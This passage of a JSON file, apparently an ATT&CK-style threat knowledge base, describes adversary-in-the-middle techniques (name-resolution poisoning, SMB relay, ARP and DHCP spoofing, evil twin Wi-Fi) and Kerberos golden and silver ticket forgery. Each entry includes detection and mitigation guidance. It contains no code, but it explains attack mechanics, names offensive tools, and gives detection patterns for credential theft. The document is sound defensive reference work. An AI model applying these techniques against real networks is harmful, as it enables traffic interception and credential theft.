required."}]}]},{"id":"T1557","name":"Adversary-in-the-Middle","description":"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions. <a href=\"https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 MiTM Basics)</a>\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware. <a href=\"https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ttint_rat)</a> <a href=\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/125/how-dns-changer-trojans-direct-users-to-threats\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dns_changer_trojans)</a> <a href=\"https://securelist.com/ad-blocker-with-miner-included/101105/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ad_blocker_with_miner)</a> Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie). <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Token tactics)</a> Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm. <a href=\"https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mitm_tls_downgrade_att)</a> <a href=\"https://arxiv.org/abs/1809.05681\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: taxonomy_downgrade_att_tls)</a> <a href=\"https://tlseminar.github.io/downgrade-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: tlseminar_downgrade_att)</a>\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to impair defenses and/or in support of a Network Denial of Service.","detection":"Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Content","Windows Registry: Windows Registry Key Modification","Network Traffic: Network Traffic Flow","Service: Service Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit access to network infrastructure and resources that can be used to reshape traffic or otherwise produce AiTM conditions."},{"id":"M1037","name":"Filter Network Traffic","description":"Use network appliances and host-based security software to block network traffic that is not necessary within the environment, such as legacy protocols that may be leveraged for AiTM conditions."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable legacy network protocols that may be used   to intercept network traffic if applicable, especially those that are not needed within an environment."}],"subTechniques":[{"id":"T1557.001","name":"Name Resolution Poisoning and SMB Relay","description":"By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. <a href=\"https://www.trendmicro.com/en_us/research/22/d/an-investigation-of-the-blackcat-ransomware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackCat ransomware)</a> This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. <a href=\"https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia LLMNR)</a> <a href=\"https://technet.microsoft.com/library/cc958811.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet NetBIOS)</a>\n\nMulticast Domain Name System(mDNS) is a zero-configuration service used to resolve hostnames to IP addresses with “.local” as a top-level domain. MDNS is based upon Domain Name System (DNS) format and allows hosts on the same network segment to perform name resolution for other hosts, using multicast. <a href=\"https://datatracker.ietf.org/doc/html/rfc6762\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mDNS RFC)</a>\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137)/mDNS (UDP 5353) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. <a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: byt3bl33d3r NTLM Relaying)</a> <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a> Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various other protocols, such as LDAP, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. <a href=\"https://github.com/nomex/nbnspoof\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub NBNSpoof)</a> <a href=\"https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 LLMNR Spoofer)</a> <a href=\"https://github.com/SpiderLabs/Responder\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Responder)</a>","detection":"Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. <a href=\"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sternsecurity LLMNR-NBTNS)</a>\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool. <a href=\"https://github.com/Kevin-Robertson/Conveigh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Conveigh)</a> Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques. <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a>","platforms":["Windows"],"dataSources":["Service: Service Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access. This may mitigate, or at least alleviate, the scope of AiTM activity."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Use host-based security software to block LLMNR/NetBIOS/mDNS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks. <a href=\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: byt3bl33d3r NTLM Relaying)</a> <a href=\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secure Ideas SMB Relay)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/system-center/operations-manager-2005/cc180803(v=technet.10)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SMB Packet Signing)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable LLMNR, mDNS, and NetBIOS in local computer security settings or by group policy if they are not needed within an environment. <a href=\"https://adsecurity.org/?p=3299\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Windows Secure Baseline)</a>"}]},{"id":"T1557.002","name":"ARP Cache Poisoning","description":"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. <a href=\"https://tools.ietf.org/html/rfc826\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RFC826 ARP)</a> Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache. <a href=\"https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans ARP Spoofing Aug 2003)</a> <a href=\"https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Cleaver)</a>\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol. <a href=\"https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sans ARP Spoofing Aug 2003)</a>","detection":"Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.","platforms":["Linux","Windows","macOS"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Create static ARP entries for networked devices. Implementing static ARP entries may be infeasible for large networks."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider enabling DHCP Snooping and Dynamic ARP Inspection on switches to create mappings between IP addresses requested via DHCP and ARP tables and tie the values to a port on the switch that may block bogus traffic. <a href=\"https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco ARP Poisoning Mitigation 2016)</a> <a href=\"https://www.juniper.net/documentation/en_US/junos/topics/task/configuration/understanding-and-using-dai.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper DAI 2020)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling updating the ARP cache on gratuitous ARP replies."}]},{"id":"T1557.003","name":"DHCP Spoofing","description":"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. <a href=\"https://datatracker.ietf.org/doc/html/rfc2131\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rfc2131)</a> The typical server-client interaction is as follows: \n\n1. The client broadcasts a <code>DISCOVER</code> message.\n\n2. The server responds with an <code>OFFER</code> message, which includes an available network address. \n\n3. The client broadcasts a <code>REQUEST</code> message, which includes the network address offered. \n\n4. The server acknowledges with an <code>ACK</code> message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. <a href=\"https://isc.sans.edu/forums/diary/new+rogueDHCP+server+malware/6025/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: new_rogue_DHCP_serv_malware)</a> <a href=\"https://web.archive.org/web/20150923175837/http://www.symantec.com/security_response/writeup.jsp?docid=2009-032211-2952-99&tabid=2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: w32.tidserv.g)</a> Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address. <a href=\"https://datatracker.ietf.org/doc/html/rfc3315\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rfc3315)</a> Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.","detection":"Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dhcp_serv_op_events)</a> <a href=\"https://web.archive.org/web/20231202025258/https://lockstepgroup.com/blog/monitor-dhcp-scopes-and-detect-man-in-the-middle-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: solution_monitor_dhcp_scopes)</a>","platforms":["Linux","Windows","macOS"],"dataSources":["Network Traffic: Network Traffic Content","Application Log: Application Log Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800668(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dhcp_serv_op_events)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Consider filtering DHCP traffic on ports 67 and 68 to/from unknown or untrusted DHCP servers. Additionally, port security may also be enabled on layer switches. Furthermore, consider enabling DHCP snooping on layer 2 switches as it will prevent DHCP spoofing attacks and starvation attacks. Consider tracking available IP addresses through a script or a tool. \n\nAdditionally, block DHCPv6 traffic and incoming router advertisements, especially if IPv6 is not commonly used in the network. <a href=\"https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ntlm_relaying_kerberos_del)</a>"}]},{"id":"T1557.004","name":"Evil Twin","description":"Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture. <a href=\"https://www.bleepingcomputer.com/news/security/australian-charged-for-evil-twin-wifi-attack-on-plane/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Australia ‘Evil Twin’)</a>\n\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks. <a href=\"https://usa.kaspersky.com/resource-center/preemptive-safety/evil-twin-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky evil twin)</a> <a href=\"https://kavigihan.medium.com/wireless-security-evil-twin-attack-d3842f4aef59\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: medium evil twin)</a>  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks. <a href=\"https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: specter ops evil twin)</a>  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network. <a href=\"https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: specter ops evil twin)</a>  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\n\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.","detection":"","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be suspicious about access points marked as “Open” or “Unsecure” as well as certificate errors. Certificate errors may arise when the application’s certificate does not match the one expected by the host."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Wireless intrusion prevention systems (WIPS) can identify traffic patterns indicative of adversary-in-the-middle activity and scan for evils twins and rogue access points."}]}]},{"id":"T1558","name":"Steal or Forge Kerberos Tickets","description":"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC). <a href=\"https://adsecurity.org/?p=227\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Kerberos Ring Decoder)</a> Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets. <a href=\"https://docs.microsoft.com/windows-server/administration/windows-commands/klist\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Klist)</a>","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests. <a href=\"https://adsecurity.org/?p=1515\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Detecting Forged Tickets)</a> <a href=\"https://blog.stealthbits.com/detect-pass-the-ticket-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Detect PtT 2019)</a> <a href=\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU Golden Ticket Protection)</a>\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration. <a href=\"https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Kerberos Golden Ticket)</a>\n\nMonitor for indications of Pass the Ticket being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]). <a href=\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detecting Kerberoasting Feb 2018)</a> <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>\n\nMonitor for unexpected processes interacting with lsass.exe. <a href=\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting Attempts to Steal Passwords from Memory)</a> Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\n\nMonitor for unusual processes accessing <code>secrets.ldb</code> and <code>.secrets.mkey</code> located in <code>/var/lib/sss/secrets/</code>.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Logon Session: Logon Session Metadata","Active Directory: Active Directory Credential Request","File: File Access"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days. <a href=\"https://www.stigviewer.com/stig/windows_server_2016/2019-12-12/finding/V-91779\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: STIG krbtgt reset)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.\n\nLimit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> Also consider using Group Managed Service Accounts or another third party product such as password vaulting. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1043","name":"Credential Access Protection","description":"On Linux systems, protect resources with Security Enhanced Linux (SELinux) by defining entry points, process types, and file labels. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a>"},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."}],"subTechniques":[{"id":"T1558.001","name":"Golden Ticket","description":"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. <a href=\"https://adsecurity.org/?p=1640\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Kerberos GT Aug 2015)</a> Golden tickets enable adversaries to generate authentication material for any account in Active Directory. <a href=\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU Golden Ticket Protection)</a> \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS. <a href=\"https://adsecurity.org/?p=1515\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Detecting Forged Tickets)</a>\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. <a href=\"https://adsecurity.org/?p=483\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Kerberos and KRBTGT)</a> The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests. <a href=\"https://adsecurity.org/?p=483\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Kerberos and KRBTGT)</a> <a href=\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU Golden Ticket Protection)</a> <a href=\"https://blog.stealthbits.com/detect-pass-the-ticket-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Detect PtT 2019)</a>\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration. <a href=\"https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Kerberos Golden Ticket)</a>\n\nMonitor for indications of Pass the Ticket being used to move laterally.","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Credential Request","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days. <a href=\"https://www.stigviewer.com/stig/windows_server_2016/2019-12-12/finding/V-91779\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: STIG krbtgt reset)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts."}]},{"id":"T1558.002","name":"Silver Ticket","description":"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets. <a href=\"https://adsecurity.org/?p=2011\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Silver Tickets)</a>\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike 